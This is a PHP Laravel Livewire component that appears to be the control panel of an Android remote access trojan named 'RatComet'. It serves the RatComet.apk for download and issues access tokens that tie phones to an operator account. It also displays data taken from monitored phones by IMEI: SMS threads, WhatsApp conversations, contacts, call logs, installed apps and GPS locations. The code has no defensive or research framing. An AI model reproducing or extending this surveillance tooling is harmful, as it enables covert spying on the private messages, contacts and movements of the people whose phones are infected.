<?php

namespace App\Http\Livewire\Client;

use Livewire\Component;
use Auth;
use App\Models\Contact;
use App\Models\ContactLog;
use App\Models\Sms;
use App\Models\SocialApp;
use App\Models\App;
use App\Models\Location;
use App\Models\MobileAccessToken;
use Illuminate\Support\Str;
use DB;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Storage;

class Home extends Component
{
    public $phoneImei;
    public $menu = 0;
    public $subMenu;
    private $token;
    // data
    public $smsList = [];
    public $smsConversationList = [];
    public $selectedSmsConversation;
    private $skipFirstSms = 0;

    public $appsList = [];
    public $contactList = [];
    public $callLogList = [];
    public $phoneList = [];
    private $locationList = [];
    public $tokenList = [];

    public $whatsappList = [];
    public $whatsappConversationList = [];
    public $selectedWhatsappConversation;
    private $skipFirstWhatsapp = 0;

    public function showWhatsapp() {
        $this->resetChoice();
        $this->menu = '7';
    }
    public function download() {
        return Storage::download('public/mobile/RatComet.apk', "RatComet.apk",['Content-Type'=>'application/vnd.android.package-archive','Content-Disposition'=>'attachment;filename="RatComet.apk"',]);
    }
    public function showWhatsappConversation($contact) {
        $this->skipFirstWhatsapp = 1;
        $this->selectedWhatsappConversation = $contact;
        $this->whatsappConversationList = SocialApp::orderBy('position','ASC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $contact])->get();
    }
    public function showSms() {
        $this->resetChoice();
        $this->menu = '1';
    }
    public function showSmsConversation($contact) {
        $this->skipFirstSms = 1;
        $this->selectedSmsConversation = $contact;
        $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
    }
    public function showTwitter() {
        $this->resetChoice();
    }
    public function showContacts() {
        $this->resetChoice();
        $this->menu = '2';
    }
    public function showCallLogs() {
        $this->resetChoice();
        $this->menu = '3';
    }
    public function showDashboard() {
        // get all regquired adat from db
        $this->resetChoice();
        $this->menu = '0';
    }
    public function showApps() {
        $this->resetChoice();
        $this->menu = '4';
    }
    public function showLocation() {
        $this->resetChoice();
        $this->menu = '6';
        // dd($this->locationList);
    }
    public function showPhone() {
        $this->resetChoice();
        $this->menu = '5';
    }
    public function newToken() {
        $this->resetChoice();
        $this->menu = '8';
        $this->tokenList = Auth::user()->mobileAccessToken;
    }
    public function showMobileClient() {
        $this->resetChoice();
        $this->menu = '9';
    }
    public function genToken() {
        while(True) {
            $this->token  = $this->getRandomString(6);
            $token_array = MobileAccessToken::pluck('token')->toArray();
            if(!Arr::has($token_array,$this->token)){
                Auth::user()->mobileAccessToken()->create(["token" => $this->token]);
                break;
            }
        }
    
    }

    private function resetChoice() {

        //reset data entry
        $this->reset(['smsConversationList','whatsappConversationList','smsList','appsList','contactList','callLogList','phoneList','whatsappList']);
    }
    private function getRandomString($n) {
        $characters = '123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ';
        $randomString = '';
      
        for ($i = 0; $i < $n; $i++) {
            $index = rand(0, strlen($characters) - 1);
            $randomString .= $characters[$index];
        }
      
        return $randomString;
    }

    public function render()
    {
        $tokens = Auth::user()->mobileAccessToken()->has('phone')->get();
        $tmphones = [];
        foreach($tokens as $token){
            array_push($tmphones,$token->phone);
        }
        $this->phoneList = $tmphones;

        if($this->menu == '1'){
            if($this->skipFirstSms == 0)  {
                $this->smsList = Sms::latest('date')->where('imei',$this->phoneImei)->get()->unique('contact');
                if($this->smsList->count() != 0) {
                    $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
                    $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
                }
            }
        
        }else if($this->menu == '2'){
            $this->contactList = Contact::where('imei',$this->phoneImei)->get();

        }else if($this->menu == '3') {
            $this->callLogList = ContactLog::where('imei',$this->phoneImei)->orderBy("date","DESC")->get();

        }else if($this->menu == '4') {
            $this->appsList = App::where('imei',$this->phoneImei)->get();

        }else if($this->menu == '6') {
            $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude')->toArray();

        }else if($this->menu == '7') {
            if($this->skipFirstWhatsapp == 0) {
                $this->whatsappList = SocialApp::orderBy('position','DESC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact')->sortByDesc('currentDate');
                if($this->whatsappList->count() != 0){
                    $this->selectedWhatsappConversation = $this->whatsappList->first()->contact;
                    $this->whatsappConversationList = SocialApp::orderBy('position','ASC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
                }
            }
        }else{

        }

    
        return view('livewire.client.home',[
            "locationList" => $this->locationList,
            "token" => $this->token,
        ]);
    }
}
